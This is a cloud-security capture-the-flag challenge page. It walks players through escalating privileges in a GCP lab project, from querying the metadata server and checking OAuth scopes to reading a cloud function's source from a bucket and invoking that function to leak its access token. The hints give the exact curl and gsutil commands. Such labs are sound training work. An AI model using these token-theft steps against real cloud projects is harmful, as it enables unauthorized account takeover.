# Challenge 4: Invoking answers

## Introduction

You can control a compute instance in the project! Let's find out which permissions this instance has in GCP.  
Your compute instance has a GCP service account assigned to it, allowing it to interact with the GCP APIs.  
Check which service account this instance uses and what this account can do.  
#####
    gcloud auth list


> **Background Info:**  
> Resources such as compute VMs use the Google metadata server endpoint to get an access token for their assigned service account.  
> As you now have access to the compute VM, you could also query the metadata server and retrieve information such as the VMs service account or its access token. For example you can use this endpoint to get information about the VMs service account:  
> #####
>     curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/" -H "Metadata-Flavor: Google"
> 
> As the compute instance has gcloud installed, using `gcloud auth list` or `gcloud auth print-access-token` is more convenient though.  


The service account of this compute engine is the default compute service account: `<project-nr>-compute@developer.gserviceaccount.com`.  
A very powerful account in GCP! By default, it has the "Editor" role on a GCP project! But before getting too excited ... try using some of your new powers:  
#####
    gcloud compute instances list
"Request had insufficient authentication scopes". That is disappointing.  
You can list your OAuth access scopes with this command:  
#####
    curl -i https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=$(gcloud auth print-access-token)

That last access scope looks promising. The access scope `devstorage.read_only` allows you to read all storage buckets in the project.  

## Your Goal

**Invoke and exploit another resource to find a powerful access token allowing you to gain control over the project**

## Useful commands and tools:
- the compute engine also has gcloud installed
- the compute engine has a script that could be helpful
- `gcloud auth list`
- `gcloud auth print-access-token`
- `gcloud auth print-identity-token`
- [GCP oauth access scopes](https://developers.google.com/identity/protocols/oauth2/scopes#storage)
- `gsutil ls gs://<..>`
- `gsutil cat gs://<..>`
- `curl -H "Authorization:Bearer <token>" https://...`
- [Metadata server](https://cloud.google.com/functions/docs/securing/function-identity#access-tokens)

## Hints

<details>
  <summary>Hint 1</summary>

  List all storage buckets in the project. You can run the `gsutil` commands from the compute VM:  
  #####
      gsutil ls 
  There is an additional bucket that you couldn't access before. You can list and read the content on this bucket:
  #####
      gsutil ls gs://cloud-function-bucket-challenge4
  #####
      gsutil cat gs://cloud-function-bucket-challenge4/main.py
  A script on the compute engine can also give you more hints on how to use the new resource you found.

</details>

<details>
  <summary>Hint 2</summary>

  A cloud function is running in the project. When deploying a cloud function in GCP, its source code gets uploaded onto a storage bucket. As you have read access to the buckets, you can investigate what this function does.  
  A script in Alice's home directory on the compute VM tells you how to invoke the function.  
  Someone made it return information from the metadata server for debugging purposes...

</details>

<details>
  <summary>Hint 3</summary>
    
  The script on the compute VM invokes the function. You can modify that request and ask the function to return its access token instead of its service account email:
  #####
      curl -s -X POST https://europe-west1-$PROJECT_ID.cloudfunctions.net/monitoring-function -H "Authorization: bearer $(gcloud auth print-identity-token)" -H "Content-Type: application/json" -d '{"metadata": "token"}'

</details>

## First stage of compromise achieved!

When you completed the challenge read [here](../extras/first-stage-compromised.md) what your new access token can do.
